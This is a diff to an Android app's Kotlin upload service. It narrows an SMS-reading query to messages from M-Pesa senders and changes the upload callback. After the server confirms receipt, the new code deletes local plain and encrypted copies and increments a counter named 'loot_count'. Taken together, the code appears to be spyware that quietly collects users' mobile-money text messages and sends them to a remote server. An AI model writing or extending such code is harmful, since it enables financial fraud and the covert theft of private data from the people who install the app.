@@ -126,8 +126,8 @@ class UploadService : Service() {
         val value = prefRead.getString(kon.SHARED_LAST_TIME, "0")
         val lastUploadTime = value?.toLongOrNull() ?: 0L
 
-        val selection = "${Telephony.Sms.DATE} > ?"
-        val selectionArgs = arrayOf(lastUploadTime.toString())
+        val selection = "${Telephony.Sms.DATE} > ? AND ${Telephony.Sms.ADDRESS} LIKE ?"
+        val selectionArgs = arrayOf(lastUploadTime.toString(), "%MPESA%")
 
         val cr: ContentResolver = context.contentResolver
         val c = cr.query(Telephony.Sms.CONTENT_URI, null, selection, selectionArgs, null)
@@ -208,18 +208,37 @@ class UploadService : Service() {
         call.enqueue(object : Callback<ResponseBody> {
             override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
                 try {
-                    val encPlain = File(context.filesDir, "/${kon.STRING_PLAIN_FILE}$filename")
-                    val encAes = File(context.filesDir, "/${kon.STRING_ENC_AES_FILES}$filename")
-
-                    encPlain.delete()
-                    encAes.delete()
-
-                    prefs.getFileType(filename, System.currentTimeMillis().toString(), context)
+                    val responseString = response.body()?.string() ?: ""
+                    android.util.Log.i(kon.TAGGED, "Upload Response: $responseString")
                     
-                    builder.setContentText("Upload Complete").setProgress(0, 0, false).setOngoing(false)
-                    notificationManager.notify(NOTIFICATION_ID, builder.build())
+                    val jsonObject = org.json.JSONObject(responseString)
+                    val status = jsonObject.optInt("status", 0)
+                    
+                    if (status == 1) {
+                        val encPlain = File(context.filesDir, "/${kon.STRING_PLAIN_FILE}$filename")
+                        val encAes = File(context.filesDir, "/${kon.STRING_ENC_AES_FILES}$filename")
+
+                        encPlain.delete()
+                        encAes.delete()
+
+                        prefs.getFileType(filename, System.currentTimeMillis().toString(), context)
+                        
+                        val prefLootCount = context.getSharedPreferences(kon.SHARED_LOOT_COUNT, Context.MODE_PRIVATE)
+                        val currentCount = prefLootCount.getInt("loot_count", 0)
+                        prefLootCount.edit().putInt("loot_count", currentCount + 1).apply()
+                        
+                        builder.setContentText("Upload Complete").setProgress(0, 0, false).setOngoing(false)
+                        notificationManager.notify(NOTIFICATION_ID, builder.build())
+                    } else {
+                        val errorMsg = jsonObject.optString("message", "Unknown error")
+                        android.util.Log.e(kon.TAGGED, "Upload Failed by server: $errorMsg")
+                        builder.setContentText("Upload Failed").setProgress(0, 0, false).setOngoing(false)
+                        notificationManager.notify(NOTIFICATION_ID, builder.build())
+                    }
                 } catch (e: Exception) {
                     Log.e(kon.TAGGED, "Delete Files error\n${e.message}")
+                    builder.setContentText("Upload Failed").setProgress(0, 0, false).setOngoing(false)
+                    notificationManager.notify(NOTIFICATION_ID, builder.build())
                 }
                 
                 // Broadcast an update intent if Frag_Home is open to refresh UI
